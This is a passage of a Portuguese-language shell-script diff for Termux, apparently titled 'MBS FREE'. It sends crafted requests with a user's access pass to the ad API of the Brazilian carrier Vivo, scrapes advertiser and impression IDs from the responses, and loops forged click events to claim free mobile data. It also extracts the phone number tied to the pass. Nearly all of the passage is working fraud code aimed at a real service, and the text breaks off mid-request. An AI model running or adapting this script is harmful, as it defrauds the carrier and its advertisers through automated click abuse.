+X9deToken2=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A102%2C%22target%22%3A%22slot%3D102%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852321632267696163226764515871178651666272523390%3BCTData%3Dgpv%3D3ckp%3Dcddm%3Dvivocombrapv15www44%3D4cpv15www44%3D3rpv15www44%3D3%3BgaGB9C14SX2D%3DGS11163227460731163227463532%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401696994391sessionf4b43fa1a5d44b1caff998388c8331e71633751668%3BgaDMLPJDP0E3%3DGS1116337495891116337498100%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1310319720541633906861%3Bttnprf%3D%3BgatgtagUA1640616782%3D1%3BgatgtagUA1640616781%3D1%3Bttcvmt%3D1633992745%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1633992745047%3Bos%3Dandroid%3BtailCity%3Dcuiaba%3BtailtState%3Dmato%2520grosso%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3Dbr%22%7D%5D&pageId=660224&insertionId=&insertionUUID=&insertionType=&referer=http%3A%2F%2Finternetgratis.vivo.com.br%2F&accessPass=$AccessPass" http://e.vivo.ddivulga.com/api/v2.1/fetch -H "Origin: http://navegue.vivo.com.br") 
+
+
+X9deToken=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A%22101%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22102%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22103%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22104%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%5D&pageId=660224&insertionId=&insertionUUID=&insertionType=&referer=http%3A%2F%2Finternetgratis.vivo.com.br%2F&accessPass=$AccessPass" http://e.vivo.ddivulga.com/api/v2.1/fetch -H "Origin: http://a.vivo.ddivulga.com")
+
+X9deToken3=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A%22101%22%2C%22target%22%3A%22os%3Dandroid%3B%22%7D%5D&pageId=999534&insertionId=&insertionUUID=&insertionType=&referer=http%3A%2F%2Fclubefacil.com%2F&accessPass=$AccessPass" http://e.vivo.ddivulga.com/api/v2.1/fetch -H "Origin:http://a.vivo.ddivulga.com")
+
+echo -e "$X9deToken" >> tokencreator.txt
+echo -e "$X9deToken2" >> tokencreator2.txt
+
+NumeroDeTelefone=$(cat tokencreator2.txt | grep -o msisdn.................................... | cut -d '"' -f3 | grep -n 55 | grep 1: | cut -d':' -f2)
+
+PassCheck=$(cat tokencreator2.txt | grep -o msisdn)
+
+PassVencido=$(echo "$PassCheck" | grep -c 'msisdn')
+
+
+case $PassVencido in
+0) clear ; echo -e "============================================${NADA}" ; echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}" ; echo -e "============================================${NADA}" ; echo -e "${RED}ESSE PASS ESTÁ VENCIDO OU É INVALIDO${NADA}" ; sleep 5 ; Menu5;;
+*) ;;
+esac
+
+advid=$(cat tokencreator.txt | grep -a -i -o advid..............| cut -d':' -f2 | cut -d'"' -f1)
+echo -e "$advid" >> advidcriar.txt
+
+impressionid=$(cat tokencreator.txt | grep -a -i -o impressionEventId......................................... | cut -d'"' -f3)
+echo -e "$impressionid" >> impressionidcriar.txt
+
+advname=$(cat tokencreator.txt | grep -o advName.............................................................................................. | cut -d '"' -f3-4)
+
+echo -e "$advname" >> advnamecriar.txt
+
+advreward=$(cat tokencreator.txt | grep -o rewardWebMessage2........................................................................................ | cut -d'"' -f1-3 | cut -d'.' -f1 | cut -d',' -f1 | cut -d'"' -f2-3)
+
+echo -e "$advreward" >> advrewardcriar.txt
+
+advmensagem=$(cat tokencreator.txt | grep -o headlineWebmessage1......................................................................... | cut -d'"' -f2-3 | cut -d'<' -f1 | cut -d'"' -f2 | cut -d'.' -f1)
+
+echo -e "$advmensagem" >> advmensagem.txt
+
+NewTokensRev
+}
+
+
+
+GerarOsTokens(){
+echo
+a1dvid=$(cat advidcriar.txt | grep -n , | cut -d':' -f2)
+echo -e "$a1dvid" >> advid.txt
+
+i1mpressionid=$(cat impressionidcriar.txt | grep -n - | cut -d':' -f2)
+echo -e "$i1mpressionid" >> impressionid.txt
+
+a1dvname=$(cat advnamecriar.txt | grep -n '"' | cut -d':' -f2 | cut -d'"' -f1)
+echo -e "$a1dvname" >> advname.txt
+
+a1dvreward=$(cat advrewardcriar.txt | grep -n '"' | cut -d '"' -f2 | cut -d'>' -f2 | cut -d'<' -f1)
+echo -e "$a1dvreward" >> advreward.txt
+
+Mensagem12
+}
+
+Mensagem12(){
+echo
+rm -f TokenVez.txt
+
+
+AZULALL='\e[01;37;44m'
+VermelhoAll='\e[01;37;41m'
+
+echo -e "${VermelhoAll}       TESTAGEM INICIADA        ${NADA}"
+Testador
+}
+
+
+
+
+Testador(){
+
+termux-wake-lock
+
+echo -e "1" >> TokenVez.txt
+LimiteAds=$(cat advid.txt | wc -l)
+
+TokenVez=$(cat TokenVez.txt | grep -c "1")
+
+AdvIDTest=$(cat advid.txt | tr -d ',' | sed -n "$TokenVez"p)
+
+ImpressionTest=$(cat impressionid.txt | sed -n "$TokenVez"p)
+
+AdvNameTest=$(cat advname.txt | sed -n "$TokenVez"p)
+
+AdvRewardTest=$(cat advreward.txt | sed -n "$TokenVez"p)
+
+AdvMensagemTest=$(cat advmensagem.txt | sed -n "$TokenVez"p)
+
+
+TesterElegibility=$(echo "$ImpressionTest" | grep -n - | grep -c 1:)
+
+case $TesterElegibility in
+1) ;;
+*)Ler11;;
+esac
+
+
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+echo -e "${LETRAPRETA}           TESTADOR $TokenVez           ${NADA}"
+echo -e "${YELLOW}ADV NAME: ${NADA}${YELLOW}$AdvNameTest${NADA}"
+
+echo -e "${YELLOW}ADV MENSAGEM: ${NADA}${YELLOW}$AdvMensagemTest${NADA}"
+
+rewardcheck=$(echo "$AdvRewardTest" | grep -c "ganhou")
+case $rewardcheck in
+2)echo -e "${YELLOW}ADV REWARD: ${NADA}${YELLOW}$AdvRewardTest${NADA}";;
+1)echo -e "${YELLOW}ADV REWARD: ${NADA}${YELLOW}$AdvRewardTest${NADA}";;
+0)echo -e "${YELLOW}ADV REWARD: ${NADA}${RED}Null${NADA}";;
+esac
+
+echo -e "${YELLOW}IMPRESSION EVENT ID: ${NADA}${YELLOW}$ImpressionTest${NADA}"
+
+echo -e "${YELLOW}ADV ID: ${NADA}${YELLOW}$AdvIDTest${NADA}"
+
+
+
+
+for i in $(seq 25);
+do
+
+reward1=$(curl -s "http://e.vivo.ddivulga.com/api/clickEvent" -d "advId=$AdvIDTest&eventImpressionId=$ImpressionTest&apass=$AccessPass")
+rw1=$(echo $reward1 | grep -c "evtClickId")
+case $rw1 in
+1) echo -e "${GREEN}SUCESSO NO ENVIO DOS MBS - $i/25${NADA}" ; sleep 2 ;;
+0)echo -e "${RED}NÃO ELEGIVEL NESSE TESTADOR${NADA}"; sleep 2 ; echo ; echo ; Testador;;
+esac
+
+done
+echo
+echo
+
+LimiteAds2=$(cat TokenVez.txt | wc -l)
+case $LimiteAds2 in
+$LimiteAds)Ler11;;
+*);;
+esac
+Testador
+}
+
+
+Ler11(){ 
+am start -n com.termux/com.termux.app.TermuxActivity
+clear
+Ler12
+}
+Ler12(){
+echo -e "1" >> TestesFeitos.txt
+TestesFeitos=$(cat TestesFeitos.txt | wc -l)
+echo -e "${VermelhoAll}            TESTAGEM FINALIZADA             ${NADA}"
+echo -e "${NADA}============================================${NADA}"
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+echo -e "============================================${NADA}"
+echo -e "${CINZA}NUMERO DE TELEFONE USADO:${NADA} ${GREEN}$NumeroDeTelefone${NADA}"
+echo -e "${CINZA}TESTES FEITOS COM ESSES TOKENS:${NADA} ${GREEN}$TestesFeitos${NADA}"
+echo
+
+echo -e "${NADA}${DESTACAR}1 - PROCURAR NOVOS TOKENS ${CINZA}MELHOR ESPERAR UM POUCO...${NADA}"
+echo -e "${DESTACAR}2 - REPETIR OS TOKENS USADOS ${CINZA}RECOMENDADO 1X${NADA}"
+echo -e "${DESTACAR}0 - VOLTAR${NADA}" 
+echo
+read -p "ESCOLHA UMA OPÇÃO: " denovo1
+case $denovo1 in
+1)rm -f TestesFeitos.txt ; Buscartokens;;
+2)rm -f TokenVez.txt ;Mensagem12;;
+0)MenuPrincipal;;
+*)clear  ; Ler12;;
+esac
+}
+
+
+
+
+
+ProcurarMaisTokens(){
+rm -f advmensagemrev.txt
+rm -f advrewardrev.txt
+rm -f advnamerev.txt
+rm -f ClubeFacilToken.txt
+rm -f TokensEncontrados.txt
+rm -f impressionidrev.txt
+rm -f tokencreatorrev.txt
+rm -f tokencreator2rev.txt
+rm -f advidrev.txt
+clear
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+echo -e "============================================${NADA}"
+
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+
+echo -e "============================================${NADA}"
+echo -e "${DESTACAR}PROCURANDO NOVOS TOKENS...${NADA}"
+
+X9deToken2=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A102%2C%22target%22%3A%22slot%3D102%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852321632267696163226764515871178651666272523390%3BCTData%3Dgpv%3D3ckp%3Dcddm%3Dvivocombrapv15www44%3D4cpv15www44%3D3rpv15www44%3D3%3BgaGB9C14SX2D%3DGS11163227460731163227463532%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401696994391sessionf4b43fa1a5d44b1caff998388c8331e71633751668%3BgaDMLPJDP0E3%3DGS1116337495891116337498100%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1310319720541633906861%3Bttnprf%3D%3BgatgtagUA1640616782%3D1%3BgatgtagUA1640616781%3D1%3Bttcvmt%3D1633992745%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1633992745047%3Bos%3Dandroid%3BtailCity%3Dcuiaba%3BtailtState%3Dmato%2520grosso%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3Dbr%22%7D%5D&pageId=660224&insertionId=&insertionUUID=&insertionType=&referer=http%3A%2F%2Finternetgratis.vivo.com.br%2F&accessPass=$AccessPass" http://e.vivo.ddivulga.com/api/v2.1/fetch -H "Origin: http://navegue.vivo.com.br") 
+
+
+
+
+
+X9deToken=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A%22101%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22102%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22103%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%2C%7B%22slotId%22%3A%22104%22%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Drio%2520de%2520janeiro%3BtailtState%3Drio%2520de%2520janeiro%3BtailCountry%3Dbr%22%7D%5D&pageId=660224&insertionId=&insertionUUID=&insertionType=&referer=http%3A%2F%2Finternetgratis.vivo.com.br%2F&accessPass=$AccessPass" http://e.vivo.ddivulga.com/api/v2.1/fetch -H "Origin: http://a.vivo.ddivulga.com")
+
+X9deToken4=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A%22101%22%2C%22target%22%3A%22os%3Dandroid%3B%22%7D%5D&pageId=999534&insertionId=&insertionUUID=&insertionType=&referer=http%3A%2F%2Fclubefacil.com%2F&accessPass=$AccessPass" http://e.vivo.ddivulga.com/api/v2.1/fetch -H "Origin:http://a.vivo.ddivulga.com")
+
+X9deToken3=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A110%2C%22target%22%3A%22%22%7D%5D&pageId=693930&insertionId=&insertionUUID=&insertionType=&referer=http%3A%2F%2Fportalrecarga.vivo.com.br%2F&accessPass=$AccessPass" http://e.vivo.ddivulga.com/api/v2.1/fetch -H "Origin: http://a.vivo.ddivulga.com" -w '%{response_code}')
+
+X9ClubeFacil=$(curl -s -d "slotId=%5B%7B%22slotId%22%3A101%2C%22target%22%3A%22slot%3D101%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A102%2C%22target%22%3A%22slot%3D102%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A103%2C%22target%22%3A%22slot%3D103%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A104%2C%22target%22%3A%22slot%3D104%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A107%2C%22target%22%3A%22slot%3D107%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A108%2C%22target%22%3A%22slot%3D108%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A105%2C%22target%22%3A%22slot%3D105%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A106%2C%22target%22%3A%22slot%3D106%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D273